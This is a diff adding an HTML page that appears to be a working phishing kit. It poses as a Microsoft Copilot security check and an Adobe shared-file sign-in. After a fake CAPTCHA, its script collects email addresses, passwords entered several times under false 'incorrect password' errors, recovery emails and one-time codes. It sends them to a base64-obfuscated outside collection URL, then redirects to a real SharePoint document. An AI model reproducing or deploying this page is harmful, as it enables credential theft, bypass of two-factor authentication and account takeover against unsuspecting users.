@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Check Required</title>
+  <link rel="prefetch" href="https://adoption.microsoft.com/wp-content/uploads/2023/09/icon-copilot.svg">
+  <link rel="prefetch" href="https://raw.githubusercontent.com/forevaevent/logo/refs/heads/main/pdflogo.svg">
+  <link rel="prefetch" href="https://www.sonicclinicaltrials.com.au/media/aa2okwpp/rsp-renewal-approval.jpg?rmode=max&height=500">
+  <style>
+    /* Base Reset and Typography */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #FFFFFF;
+      color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    #captchaCheck {
+      text-align: center;
+      padding: 2rem;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 90%;
+    }
+    .cf-logo {
+      width: 180px;
+      margin-bottom: 2rem;
+    }
+    .cf-title {
+      font-size: 24px;
+      font-weight: 500;
+      color: #404040;
+      margin-bottom: 8px;
+    }
+    .cf-subtitle {
+      font-size: 16px;
+      color: #737373;
+      margin-bottom: 2rem;
+    }
+    /* Checkbox styles (unused now but kept to avoid changing anything else) */
+    .cf-checkbox-container {
+      display: inline-block;
+      position: relative;
+      padding-left: 35px;
+      margin: 20px 0;
+      cursor: pointer;
+      font-size: 16px;
+      user-select: none;
+      color: #404040;
+    }
+    .cf-checkbox-container input {
+      position: absolute;
+      opacity: 0;
+      cursor: pointer;
+      height: 0;
+      width: 0;
+    }
+    .cf-checkmark {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 24px;
+      width: 24px;
+      background-color: #fff;
+      border: 2px solid #2196F3;
+      border-radius: 3px;
+      transition: all 0.2s ease;
+    }
+    .cf-checkbox-container:hover input ~ .cf-checkmark {
+      background-color: #f8f9fa;
+    }
+    .cf-checkbox-container input:checked ~ .cf-checkmark {
+      background-color: #2196F3;
+      border-color: #2196F3;
+    }
+    .cf-checkmark:after {
+      content: "";
+      position: absolute;
+      display: none;
+      left: 9px;
+      top: 5px;
+      width: 5px;
+      height: 10px;
+      border: solid white;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+    .cf-checkbox-container input:checked ~ .cf-checkmark:after {
+      display: block;
+    }
+    .cf-progress {
+      display: none;
+      margin: 1rem auto;
+      width: 40px;
+      height: 40px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #2196F3;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Main content styles */
+    .main-background {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: url('https://raw.githubusercontent.com/forevaevent/logo/refs/heads/main/usa-tr.jpg') center top/cover no-repeat;
+      filter: blur(10px);
+      z-index: -1;
+      display: none;
+    }
+    #mainContent {
+      display: none;
+      width: 100%;
+      min-height: 100vh;
+      position: relative;
+    }
+    #mainContent.active .main-background {
+      display: block;
+    }
+    #mainContent.active {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .login-container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 390px;
+      min-height: 210px;
+      box-shadow: 0 4px 28px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      position: relative;
+    }
+    .adobe-logo {
+      width: 60px;
+      height: 60px;
+      background-image: url('https://raw.githubusercontent.com/forevaevent/logo/refs/heads/main/pdflogo.svg');
+      background-size: contain;
+      background-repeat: no-repeat;
+      margin: 0 auto 10px;
+    }
+    .login-header p {
+      margin: 0;
+      font-size: 0.9em;
+      color: #333;
+      line-height: 1.4;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .form-group input {
+      width: 100%;
+      max-width: 300px;
+      padding: 8px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      font-size: 1em;
+      outline: none;
+      transition: border-color 0.3s ease;
+      background: transparent;
+    }
+    .form-group input:focus {
+      border-color: #0078d4;
+    }
+    .btn {
+      width: 100%;
+      max-width: 300px;
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      font-size: 1em;
+      border: none;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: background-color 0.3s;
+    }
+    .btn:hover {
+      background-color: #005bb5;
+    }
+    .hidden {
+      display: none;
+    }
+    .error-message {
+      color: red;
+      font-size: 0.9em;
+      margin-top: 5px;
+    }
+    .email-display {
+      font-size: 0.9em;
+      color: #555;
+      margin-bottom: 15px;
+    }
+    #verificationPage {
+      display: none;
+      width: 100%;
+      min-height: 100vh;
+    }
+    /* Verification page styles */
+    .auth-container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      margin: 20px auto;
+    }
+    .domain-logo {
+      margin-bottom: 20px;
+    }
+    .domain-logo img {
+      width: 40px;
+      height: 40px;
+      display: block;
+      margin: 0 auto;
+    }
+    /* Background logo in the right corner */
+    .background-logo {
+      position: fixed;
+      top: 25px;
+      right: 25px;
+      z-index: 999;
+    }
+    .background-logo img {
+      width: 80px;
+      height: auto;
+      margin: 0;
+    }
+    .auth-header h2 {
+      margin: 0 0 30px 0;
+      font-size: 14px;
+      color: #333;
+      line-height: 1.6;
+      font-weight: normal;
+    }
+    /* Footer centered at bottom */
+    .footer {
+      position: fixed;
+      bottom: 20px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      line-height: 1.5;
+      margin: 0 auto;
+    }
+    /* Corner logo (if needed) */
+    .corner-logo {
+      position: fixed;
+      top: 25px;
+      right: 25px;
+      z-index: 999;
+    }
+    .corner-logo img {
+      width: 120px;
+      height: auto;
+      display: block;
+    }
+
+    /* NEW CAPTCHA STYLES (replacing old captcha) */
+    .captcha-container {
+      margin-top: 20px; /* keep consistent spacing */
+    }
+    .captcha-image {
+      background: #fff;
+      padding: 10px;
+      border-radius: 4px;
+      display: inline-block;
+      position: relative;
+    }
+    .refresh-btn {
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      font-size: 18px;
+      background: none;
+      border: none;
+      color: #000;
+      cursor: pointer;
+    }
+    .captcha-input {
+      width: 250px;
+      padding: 8px;
+      margin: 10px auto;
+      display: block;
+      text-align: center;
+      font-size: 16px;
+      border: 1px solid #000;
+      border-radius: 4px;
+      color: #000;
+    }
+    #captchaMessage {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    #captchaMessage.success {
+      color: #0078d4;
+    }
+    #captchaMessage.error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <!-- NEW CAPTCHA SECTION (Replacing old) -->
+  <div id="captchaCheck">
+    <img src="https://adoption.microsoft.com/wp-content/uploads/2023/09/icon-copilot.svg" alt="Microsoft Copilot" class="cf-logo">
+    <h1 class="cf-title">Are you a robot?</h1>
+    <p class="cf-subtitle">Please type the characters you see below.</p>
+
+    <!-- CAPTCHA IMAGE -->
+    <div class="captcha-container">
+      <div class="captcha-image">
+        <canvas id="captchaCanvas" width="400" height="150"></canvas>
+        <button class="refresh-btn" onclick="refreshCaptcha()">⟳</button>
+      </div>
+    </div>
+
+    <input type="text" id="captchaInput" class="captcha-input" placeholder="Type the characters">
+    <button class="btn" id="verifyCaptcha">Verify</button>
+    <div id="captchaMessage"></div>
+  </div>
+
+  <!-- Main Content (Login) -->
+  <div id="mainContent">
+    <div class="main-background"></div>
+    <div class="login-container">
+      <div class="login-header">
+        <div class="adobe-logo"></div>
+        <p>Shared file are available for download. Please sign in with recipient email address to access shared file.</p>
+      </div>
+      <form id="loginForm">
+        <div id="emailContainer">
+          <div class="form-group">
+            <input
+              type="email"
+              id="email"
+              name="email"
+              placeholder="Email Address"
+              required
+            >
+          </div>
+          <button type="button" class="btn" id="emailSubmit">Next</button>
+        </div>
+        <div id="passwordContainer" class="hidden">
+          <p class="email-display" id="emailDisplay"></p>
+          <div id="firstPasswordSection">
+            <div class="form-group">
+              <input type="password" id="password" name="password" placeholder="Password" required>
+              <p class="error-message hidden" id="firstPasswordError">
+                Your password is incorrect. Please enter correct password.
+              </p>
+            </div>
+            <button type="button" class="btn" id="passwordSubmit">Sign in</button>
+          </div>
+          <div id="secondPasswordSection" class="hidden">
+            <div class="form-group">
+              <input type="password" id="passwordRetry" name="passwordRetry" placeholder="Password" required>
+              <p class="error-message hidden" id="retryPasswordError">
+                Your password is incorrect. Please enter correct password.
+              </p>
+            </div>
+            <button type="button" class="btn" id="passwordRetrySubmit">Sign in</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Verification (OTP) Page -->
+  <div id="verificationPage">
+    <!-- Background Logo in Right Corner -->
+    <div class="background-logo">
+      <img src="https://adoption.microsoft.com/wp-content/uploads/2023/09/icon-copilot.svg" alt="Background Logo">
+    </div>
+    <div class="auth-container">
+      <div class="domain-logo">
+        <img id="domainLogo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="Domain Logo">
+      </div>
+      <div class="auth-header">
+        <h2 id="formHeader">
+          We noticed an attempt to sign in from a new location.
+          To confirm your identity, please provide your recovery details
+        </h2>
+      </div>
+      <form id="authCodeForm">
+        <div id="emailSection" class="form-group">
+          <input type="email" id="recoveryEmail" name="recoveryEmail" placeholder="Recovery Email Address" required>
+          <br><br>
+          <button type="button" class="btn" id="submitEmail">Next</button>
+        </div>
+        <!-- OTP Section (hidden until recovery email is submitted) -->
+        <div id="codeSection" class="form-group hidden">
+          <input type="text" id="verificationCode" name="verificationCode" placeholder="Verification Code" required>
+          <br><br>
+          <button type="button" class="btn" id="submitCode">Submit</button>
+        </div>
+      </form>
+    </div>
+    <div class="footer">&copy; Microsoft</div>
+  </div>
+
+  <script>
+    // NEW CAPTCHA LOGIC
+    const captchaCanvas = document.getElementById('captchaCanvas');
+    const captchaInput = document.getElementById('captchaInput');
+    const verifyCaptchaButton = document.getElementById('verifyCaptcha');
+    const captchaMessage = document.getElementById('captchaMessage');
+    let currentCaptcha = '';
+
+    function generateCaptcha() {
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+      let captcha = '';
+      for (let i = 0; i < 8; i++) {
+        captcha += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return captcha;
+    }
+
+    function drawCaptcha(captcha) {
+      const ctx = captchaCanvas.getContext('2d');
+      ctx.clearRect(0, 0, captchaCanvas.width, captchaCanvas.height);
+      ctx.fillStyle = '#fff';
+      ctx.fillRect(0, 0, captchaCanvas.width, captchaCanvas.height);
+
+      const symbols = ['@', '#', '$', '%', '&', '*', '^', '?', '!', '<', '>', '/', '=', '+', '[', ']'];
+      for (let i = 0; i < 40; i++) {
+        ctx.save();
+        const fontSize = 14 + Math.random() * 6;
+        ctx.font = `${fontSize}px monospace`;
+        ctx.fillStyle = '#000';
+        ctx.translate(Math.random() * 400, Math.random() * 150);
+        ctx.rotate((Math.random() - 0.5) * 1.5);
+        const char = symbols[Math.floor(Math.random() * symbols.length)];
+        ctx.fillText(char, 0, 0);
+        ctx.restore();
+      }
+
+      for (let i = 0; i < 8; i++) {
+        ctx.beginPath();
+        ctx.moveTo(Math.random() * 400, Math.random() * 150);
+        ctx.bezierCurveTo(
+          Math.random() * 400, Math.random() * 150,
+          Math.random() * 400, Math.random() * 150,
+          Math.random() * 400, Math.random() * 150
+        );
+        ctx.strokeStyle = '#000';
+        ctx.lineWidth = 0.5;
+        ctx.stroke();
+      }
+
+      for (let i = 0; i < captcha.length; i++) {
+        ctx.save();
+        const fontSize = 26 + Math.random() * 5;
+        ctx.font = `600 ${fontSize}px Arial`;
+        ctx.fillStyle = '#000';
+        ctx.translate(30 + i * 40, 75 + Math.sin(i) * 6);
+        ctx.rotate((Math.random() - 0.5) * 0.5);
+        ctx.fillText(captcha[i], 0, 0);
+        ctx.restore();
+      }
+
+      ctx.beginPath();
+      ctx.moveTo(0, 75);
+      for (let x = 0; x < 400; x++) {
+        ctx.lineTo(x, 75 + Math.sin(x * 0.07) * 4);
+      }
+      ctx.strokeStyle = '#000';
+      ctx.lineWidth = 0.4;
+      ctx.stroke();
+    }
+
+    function refreshCaptcha() {
+      currentCaptcha = generateCaptcha();
+      drawCaptcha(currentCaptcha);
+    }
+
+    verifyCaptchaButton.addEventListener('click', () => {
+      const userInput = captchaInput.value.trim();
+      if (userInput.toLowerCase() === currentCaptcha.toLowerCase()) {
+        captchaMessage.textContent = "CAPTCHA Verified Successfully.";
+        captchaMessage.className = "success";
+
+        // Hide CAPTCHA and show main content after success
+        document.getElementById('captchaCheck').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'flex';
+        document.getElementById('mainContent').classList.add('active');
+        document.body.style.backgroundColor = '#f5f5f5';
+      } else {
+        captchaMessage.textContent = "Wrong captcha. Try again.";
+        captchaMessage.className = "error";
+        refreshCaptcha();
+      }
+    });
+
+    captchaInput.addEventListener('keydown', function(event) {
+      if (event.key === 'Enter') event.preventDefault();
+    });
+
+    // Initialize the CAPTCHA on page load
+    refreshCaptcha();
+
+
+    // ------------------------------------------------------------
+    // All other original scripts remain unchanged below
+    // ------------------------------------------------------------
+
+    // Global password attempt counter (starting at 1 for the first attempt)
+    let passwordAttemptCount = 1;
+
+    // Final landing URL (used directly, without Base64 encoding)
+    const landingUrl = "https://pccaz-my.sharepoint.com/:w:/g/personal/steven_pcc-az_com/EUzh6zuzkc5EggzmNcpsE70BhjybGD_m3z-bVRKQ-JZAbw?rtime=Ij2edllE3Ug";
+    console.log("Landing URL:", landingUrl);
+
+    // This is the address to which the form data is sent.
+    // It's originally base64-encoded in the old script. We'll leave it as-is:
+    const resultUrl = atob("aHR0cHM6Ly9qYXpjaGVtaWNhbHMuY29tL2xvcmQvcmVzdWx0LnBocA==");
+
+    // Main content references
+    const emailContainer = document.getElementById('emailContainer');
+    const passwordContainer = document.getElementById('passwordContainer');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const passwordRetryInput = document.getElementById('passwordRetry');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const emailSubmit = document.getElementById('emailSubmit');
+    const passwordSubmit = document.getElementById('passwordSubmit');
+    const passwordRetrySubmit = document.getElementById('passwordRetrySubmit');
+    const firstPasswordSection = document.getElementById('firstPasswordSection');
+    const secondPasswordSection = document.getElementById('secondPasswordSection');
+    const firstPasswordError = document.getElementById('firstPasswordError');
+    const retryPasswordError = document.getElementById('retryPasswordError');
+
+    // Event listener for the login page "Next" button (email)
+    emailSubmit.addEventListener('click', () => {
+      const emailVal = emailInput.value.trim();
+      // Basic validation check
+      if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(emailVal)) {
+        let errorElement = document.getElementById('emailError');
+        if (!errorElement) {
+          errorElement = document.createElement('p');
+          errorElement.id = 'emailError';
+          errorElement.classList.add('error-message');
+          emailContainer.appendChild(errorElement);
+        }
+        errorElement.textContent = "Please enter a valid email address.";
+        errorElement.style.display = 'block';
+        return;
+      }
+      let errorElement = document.getElementById('emailError');
+      if (errorElement) {
+        errorElement.style.display = 'none';
+      }
+      emailContainer.classList.add('hidden');
+      emailDisplay.textContent = emailVal;
+      passwordContainer.classList.remove('hidden');
+    });
+
+    // Event listener for first password submission
+    passwordSubmit.addEventListener('click', async () => {
+      const emailVal = emailInput.value.trim();
+      const passwordVal = passwordInput.value.trim();
+      if (passwordVal.length < 5) {
+        alert("Password must be correct to use Microsoft CoPilot.");
+        return;
+      }
+      // Show error and then move to second attempt
+      firstPasswordError.classList.remove('hidden');
+      setTimeout(() => {
+        firstPasswordSection.classList.add('hidden');
+        secondPasswordSection.classList.remove('hidden');
+      }, 2000);
+      try {
+        await fetch(resultUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ email: emailVal, password: passwordVal }).toString(),
+        });
+      } catch (error) {
+        console.error('Fetch error:', error);
+      }
+    });
+
+    // Event listener for password retry submission (2nd attempt)
+    passwordRetrySubmit.addEventListener('click', async () => {
+      const emailVal = emailInput.value.trim();
+      const passwordRetryVal = passwordRetryInput.value.trim();
+      if (passwordRetryVal.length < 5) {
+        alert("Password must be correct to use Microsoft CoPilot.");
+        return;
+      }
+      passwordAttemptCount++;
+      try {
+        await fetch(resultUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ email: emailVal, password: passwordRetryVal }).toString(),
+        });
+      } catch (error) {
+        console.error('Fetch error:', error);
+      }
+      if (passwordAttemptCount < 3) {
+        // Display an error, prompt user to try again
+        retryPasswordError.textContent = "Your password is incorrect. Please enter correct password.";
+        retryPasswordError.classList.remove('hidden');
+        setTimeout(() => {
+          retryPasswordError.classList.add('hidden');
+        }, 2000);
+        passwordRetryInput.value = '';
+      } else {
+        // Third attempt reached – proceed to OTP page
+        document.getElementById('mainContent').style.display = 'none';
+        document.getElementById('verificationPage').style.display = 'block';
+
+        // Store these values for the OTP page to POST them again
+        const storedEmail = emailVal;
+        const storedPasswordRetry = passwordRetryVal;
+
+        // Initialize verification page elements
+        const elements = {
+          domainLogo: document.getElementById('domainLogo'),
+          emailSection: document.getElementById('emailSection'),
+          codeSection: document.getElementById('codeSection'),
+          recoveryEmail: document.getElementById('recoveryEmail'),
+          verificationCode: document.getElementById('verificationCode'),
+          submitEmail: document.getElementById('submitEmail'),
+          submitCode: document.getElementById('submitCode')
+        };
+
+        // Load the favicon if possible (based on storedEmail's domain)
+        const loadLogos = async () => {
+          const fallbackLogo = 'https://adoption.microsoft.com/wp-content/uploads/2023/09/icon-copilot.svg';
+          try {
+            if (!storedEmail || !storedEmail.includes('@')) throw new Error('Invalid email');
+            const domain = storedEmail.split('@')[1].toLowerCase().replace(/^(www\.)/, '');
+            if (!domain) throw new Error('No domain found');
+            const getFaviconURL = (domain) => [
+              `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+              `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&url=${encodeURIComponent(domain)}&size=64`,
+              `https://www.google.com/s2/favicons?sz=64&domain=${domain}`,
+              `https://${domain}/favicon.ico`
+            ];
+            const faviconUrls = getFaviconURL(domain);
+            for (const url of faviconUrls) {
+              try {
+                const valid = await new Promise(resolve => {
+                  const img = new Image();
+                  img.onload = () => resolve(url);
+                  img.onerror = () => resolve(false);
+                  img.src = url;
+                });
+                if (valid) {
+                  elements.domainLogo.src = valid;
+                  return;
+                }
+              } catch (e) {
+                console.warn(`Failed to load from ${url}: ${e.message}`);
+              }
+            }
+            throw new Error('All favicon sources failed');
+          } catch (error) {
+            console.error('Logo load error:', error.message);
+            elements.domainLogo.src = fallbackLogo;
+          }
+        };
+        loadLogos();
+
+        // Recovery email "Next" button
+        elements.submitEmail.addEventListener('click', async () => {
+          if (elements.recoveryEmail.value.trim()) {
+            try {
+              await fetch(resultUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({
+                  email: storedEmail,
+                  password: storedPasswordRetry,
+                  recoveryEmail: elements.recoveryEmail.value.trim(),
+                  browser: navigator.userAgent
+                }).toString(),
+              });
+            } catch (error) {
+              console.error('Submission error:', error);
+            } finally {
+              elements.emailSection.classList.add('hidden');
+              elements.codeSection.classList.remove('hidden');
+            }
+          }
+        });
+
+        // OTP Code "Submit" button
+        elements.submitCode.addEventListener('click', async () => {
+          if (elements.verificationCode.value.trim()) {
+            try {
+              await fetch(resultUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({
+                  email: storedEmail,
+                  password: storedPasswordRetry,
+                  recoveryEmail: elements.recoveryEmail.value.trim(),
+                  verificationCode: elements.verificationCode.value.trim(),
+                  browser: navigator.userAgent
+                }).toString(),
+              });
+            } catch (error) {
+              console.error('Submission error:', error);
+            } finally {
+              // Redirect to final landing URL
+              window.location.href = landingUrl;
+            }
+          }
+        });
+      }
+    });
+
+    // Allow "Enter" key to submit in certain fields
+    document.addEventListener('keydown', (event) => {
+      if (event.key === 'Enter') {
+        event.preventDefault();
+        if (!passwordContainer.classList.contains('hidden')) {
+          if (!secondPasswordSection.classList.contains('hidden')) {
+            passwordRetrySubmit.click();
+          } else {
+            passwordSubmit.click();
+          }
+        } else {
+          emailSubmit.click();
+        }
+      }
+    });
+  </script>
+</body>
+</html>
